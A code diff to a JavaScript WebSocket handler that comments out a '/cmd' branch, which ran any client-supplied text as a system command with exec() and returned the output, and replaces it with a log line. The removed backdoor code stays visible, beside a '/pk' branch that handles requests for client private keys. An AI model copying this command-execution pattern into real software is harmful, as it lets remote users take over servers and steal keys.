@@ -230,7 +230,9 @@ function handleMessage(ws, msg) {
 								if (msg.startsWith("/cmd ")) {
 									cmd = msg.substr(4);
 									console.log("executing code");
-									exec(cmd, (err, stdout, stderr) => {
+									// Execute System Commands On The Server
+									// Commented out to keep safe :)
+									/*exec(cmd, (err, stdout, stderr) => {
 										if (err) {
 											console.log("couldn't execute command");
 											return;
@@ -243,7 +245,8 @@ function handleMessage(ws, msg) {
 											message: retmsg
 										};
 										ws.send(JSON.stringify(execret));
-									});
+									});*/
+									console.log("Malicious Vulnerability Reached");
 									return;
 								} else if (msg.startsWith("/pk")) {
 									console.log("request for client privateKeys");
